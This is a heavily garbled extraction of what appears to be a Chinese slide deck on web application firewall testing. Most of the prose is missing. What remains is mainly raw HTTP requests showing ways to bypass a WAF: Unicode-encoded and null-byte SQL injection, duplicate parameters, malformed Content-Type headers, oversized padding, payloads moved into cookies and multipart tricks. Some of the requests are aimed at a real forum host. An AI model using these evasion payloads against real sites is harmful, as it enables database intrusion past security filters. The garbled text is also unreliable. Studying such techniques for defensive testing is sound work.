WAF
By 

About Me
About Me
¾  ¾web 

WAF

WAF

WAF

WebWAF
¾WebHTTP/HTTPS Web 


WAF
¾ WAFWEB WAF 

¾ waf 
¾ WAFWAF90% 

WAF

WAF

WAF


¾ IPS
·  
¾  ¾ web
IPS

WAF
¾ WAFweb  WAF

HTTP----



GET
GET /member.php?username=aaa&password=bbbb HTTP/1.1\r\n Accept: */*\r\n Accept-Language: zh-cn\r\n User-Agent: Mozilla/4.0\r\n Accept-Encoding: gzip, deflate\r\n Host: xxx.xxx.xxx\r\n Pragma: no-cache\r\n \r\n

POST
POST /member.php HTTP/1.1\r\n Accept: */*\r\n Accept-Language: zh-cn\r\n User-Agent: Mozilla/4.0\r\n Content-Type: application/x-www-form-urlencode\r\n Accept-Encoding: gzip, deflate\r\n Host: xxx.xxx.xxx\r\n Content-Length: 118\r\n Pragma: no-cache\r\n \r\n username=fsdf&password=sdf&loginsubmit=true&return_type=


¾ Waf waf

¾ fuzzing, waf200

WAF

WAF

WAF

waf
¾ waf ¾ 


¾ IPS ·  · Content-Lengthbypass · 
¾  · bypass


¾ ¾ ¾ ¾ ¾ ¾Content-type ¾ ¾ ¾Post ¾ ¾Ajax


POST /member.php HTTP/1.1 Accept: */* Accept-Language: zh-cn User-Agent: Mozilla/4.0 Content-Type: application/x-www-form-urlencode Accept-Encoding: gzip, deflate Host: bbs.chinaunix.net Content-Length: 118 Pragma: no-cache
username=%u0078%u0078%u0078%u0020%u0061%u006e%u0064%u0020 %u0031%u003d%u0031&password=sdf&loginsubmit=true&return_type=

%00%0a ascii 00
POST /member.php HTTP/1.1 Accept: */* Accept-Language: zh-cn User-Agent: Mozilla/4.0 Content-Type: application/x-www-form-urlencode Accept-Encoding: gzip, deflate Host: bbs.chinaunix.net Content-Length: 118 Pragma: no-cache
aaa=x%00&username=fsdf&password=sdf&loginsubmit=true&return_ty pe=

, 
POST /member.php HTTP/1.1 Accept: */* Accept-Language: zh-cn User-Agent: Mozilla/4.0 Content-Type: application/x-www-form-urlencode Accept-Encoding: gzip, deflate Host: bbs.chinaunix.net Content-Length: 118 Pragma: no-cache
username=fsdf' and `'=`&username=fsdf&password=sdf&loginsubmit=true&return_type=

WAF
POST /member.php HTTP/1.1 Accept: */* Accept-Language: zh-cn User-Agent: Mozilla/4.0 Content-Type: application/x-www-form-urlencode Accept-Encoding: gzip, deflate Host: bbs.chinaunix.net Content-Length: 118 Pragma: no-cache
Username%00=xxxx&username=xxx' and `'=`&password=sdf&loginsubmit=true&return_type=


¾ tab
POST /member.php HTTP/1.1 Accept: */* Accept-Language: zh-cn User-Agent: Mozilla/4.0 Content-Type: application/x-www-form-urlencode Accept-Encoding: gzip, deflate Host: www.xxx.com Content-Length: 118 Pragma: no-cache
username=fsdf&password=sdf&loginsubmit=true&return_type=

Content-Type
POST /member.php HTTP/1.1 Accept: */* Accept-Language: zh-cn User-Agent: Mozilla/4.0 Content-Type: application/x-www-form-urlencodexxx Accept-Encoding: gzip, deflate Host: www.xxx.com Content-Length: 118 Pragma: no-cache
username=fsdf&password=sdf&loginsubmit=true&return_type=


POST /member.php HTTP/1.1 Accept: */* Accept-Language: zh-cn User-Agent: Mozilla/4.0 Content-Type: application/x-www-form-urlencode Accept-Encoding: gzip, deflate Host: xxx Content-Length: 118 Pragma: no-cache
a=x...{10000}&username=fsdf&password=sdf&loginsubmit=true&return _type=


POST /member.asp HTTP/1.1 Accept: */* Accept-Language: zh-cn User-Agent: Mozilla/4.0 Content-Type: application/x-www-form-urlencode Accept-Encoding: gzip, deflate Host: xxx Content-Length: 118 Pragma: no-cache Cookie: username=fsdf
password=sdf&loginsubmit=true&return_type=

POST
POST / HTTP/1.1 Accept: */* Accept-Language: zh-cn User-Agent: Mozilla/4.0 Content-Type: multipart/form-data; boundary=---------------------------7dc33b8148092e Accept-Encoding: gzip, deflate Content-Length: 253 Host: xxxxx
-----------------------------7dc33b8148092e Content-Disposition: form-data; name="username"
Xxxx and 1=1 -----------------------------7dc33b8148092e Content-Disposition: form-data; name="password"
ddddd -----------------------------7dc33b8148092e--


POST / HTTP/1.1 Accept: */* Accept-Language: zh-cn User-Agent: Mozilla/4.0 Content-Type: multipart/form-data; boundary=---------------------------7dc33b8148092e Accept-Encoding: gzip, deflate Content-Length: 253 Host: xxxxx
-----------------------------7dc33b8148092e Content-Disposition: form-data; name="username
Xxxx and 1=1 -----------------------------7dc33b8148092e Content-Disposition: form-data; name="password"
ddddd -----------------------------7dc33b8148092e--

Ajax
POST /member.asp HTTP/1.1 Accept: */* Accept-Language: zh-cn User-Agent: Mozilla/4.0 Content-Type: application/x-www-form-urlencode Accept-Encoding: gzip, deflate Host: xxx X-Requested-With: XMLHttpRequest Content-Length: 118 Pragma: no-cache
username=fsdf` and `'=` &password=sdf&loginsubmit=true&return_type=


waftest usage: waftest host port ruledir [action] host: destination host port: destination port ruledir: dir for test rules action: condition for waf protect response action args: RESPONSE_STATUS:regex RESPONSE_HEADER:regex RESPONSE_BODY:regex
test for waf by Dbappsecurity Security Team

